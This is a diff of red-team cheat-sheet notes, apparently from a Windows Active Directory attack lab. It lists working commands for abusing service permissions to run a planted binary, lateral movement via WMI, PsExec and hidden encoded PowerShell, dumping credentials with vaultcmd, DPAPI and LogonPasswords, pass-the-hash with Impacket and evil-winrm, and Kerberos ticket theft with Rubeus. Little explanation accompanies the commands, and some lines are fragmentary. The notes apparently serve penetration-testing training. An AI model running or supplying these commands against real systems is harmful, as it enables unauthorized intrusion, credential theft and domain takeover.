@@ -1,3 +1,4 @@
+SharpShell var defender = SCM.GetService("hostname", "WinDefend"); return defender.Status.ToString();
 # APPLOCKER
 Find  GpcFileSysPath of the GPO
 KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Script\9428c672-5fc3-47f4-808a-a0011f36dd2c
@@ -22,7 +23,7 @@ PowerUp
 SharpUp
 Watson
 WindowsService
-
+---------------------
 Weak Service Permissions
 SharUp
 PowerShell 'CYBER AI Service' | Get-ServiceAcl | Select-Object -ExpandProperty Access
@@ -32,6 +33,11 @@ Shell sc qc "CYBER AI Service"
 Shell sc stop "CYBER AI Service"
 Shell sc start "CYBER AI Service"
 
+ShellCmd /shellcommand:"sc config \"CYBER AI Service\" binPath=\"c:\\Temp\80.exe\""
+ShellCmd /shellcommand:"sc stop \"CYBER AI Service\" "
+ShellCmd /shellcommand:"sc qc \"CYBER AI Service\" "
+ShellCmd /shellcommand:"sc start \"CYBER AI Service\" "
+------------------------------------------------------------------
 Unquoted Service Paths
 C:\Program Files\CYBER\CYBER FW\FwSvc.exe
 
@@ -45,7 +51,9 @@ SharpShell /code:"var startInfo = new System.Diagnostics.ProcessStartInfo { File
 --Grunt Service Binary --
 --Connect localhost rastasvc--
 --pesexec or wmiexec --powershell
-wmic /node:"hostname" /user:"domain.io\n.lamb" /password:"pass" process call create “powershell -Sta -Nop -Window Hidden -EncodedCommand “”
+
+Shellcmd wmic /node:"hostname" /user:"domain.io\n.lamb" /password:"pass" process call create “powershell -Sta -Nop -Window Hidden -EncodedCommand “”
+wmigrunt wkstn-4945 powershell 
 
 SharpWMI /command:"action=exec computername=hostname command=\"C:\Temp\rasta3.exe"
 
@@ -53,6 +61,12 @@ connect hostname pipensvc
 
 PowerShellRemotingCommand hostname "powershell.exe -Sta -Nop -Window Hidden -EncodedCommand '' "
 PowerShellRemotingCommand hostname "C:\users\n.lamb\AppData\Local\Temp\GruntSMB.exe" cyberbotic.io user password
+
+WMICommand hostname path user password
+connect hostname pipensvc
+
+psexec hostname servicebinary
+connect hostname 
 
 ---------------------------------------------------------------------------------------
 #DOMAIN RECONNAISSANCE
@@ -81,8 +95,10 @@ PowerShell Get-DomainTrust                                                      
 BloodHound
 -----------------
  Assembly /assemblyname:"SharpHound3" /parameters:"-c All GPOLocalGroup"
+ proxychains bloodhound-python  -u user  -p  pass -d domain -ns 10.95.108.1 -gc namemachine  --dns-tcp   done
  
- ---------------------------------------------------------------------------
+ 
+---------------------------------------------------------------------------
  #Credentials & User Impersonation
  
  LogonPasswords 
@@ -125,7 +141,7 @@ BloodHound
  
  Lateral Movement
  Windows Management Instrumentation (WMI)
- wmic /node:"wkstn-4945" /user:"cyberbotic.io\n.lamb" /password:"REDACTED" process call create "powershell -enc [...snip...]"
+ wmic /node:"wkstn-4945" /user:"cyberbotic.io\n.lamb" /password:"REDACTED" WMICommand wkstn-4945 powershell -Sta -Nop -Window Hidden -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAY [...snip...]"
  SharpWMI /command:"action=exec computername=wkstn-4945 command=\"C:\Windows\Temp\GruntHTTP.exe\""
  PowerShell Remoting
  PowerShellRemotingCommand wkstn-4945 "powershell -enc [...snip...]"
@@ -172,7 +188,7 @@ route add 10.10.0.0/16 1
 proxychains nmap -n -sT -Pn -p445 10.10.120.1
 
 Impacket
-proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes e353da88f9c4331504f70d471f0f9cb1:REDACTED n.glover@10.10.120.1
+proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes REDACTED:REDACTED user@10.10.120.1
 proxychains evil-winrm -u n.glover -H REDACTED -i 10.10.120.1
 
 Windows
@@ -203,6 +219,7 @@ route add 10.10.120.0/23 2
 
 #Data Protection API
 Credential Manager
+ShellCmd vaultcmd /listcreds:"Windows Credentials" /all
 sekurlsa::dpapi 
 dpapi::masterkey
 
@@ -220,12 +237,14 @@ hascat 18200
 
 Unconstrained Delegation
 PowerShell Get-DomainComputer -Unconstrained -Properties DnsHostName
-Rubeus dump
-Rubeus dump /luid:0x1fdf42b
-Rubeus dump /service:krbtgt
+Rubeus triage
+Rubeus dump   pillar el usuario de dominio  0x2fb8d49  | w.schneider @ CYBERBOTIC.IO   | krbtgt/CYBERBOTIC.IO 
+Rubeus dump /luid:0x2fb8d49  
+Rubeus dump /service:krbtgt  -todos?
 Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
-Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...]
-ImpersonateProcess 2768
+Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...] luid del proceso
+ImpersonateProcess 2768 n proceso
+PowerShellRemotingGrunt dc-1 PowerShell
 
 The "Printer Bug"
 Assembly /assemblyname:"Rubeus" /parameters:"dump /service:krbtgt"
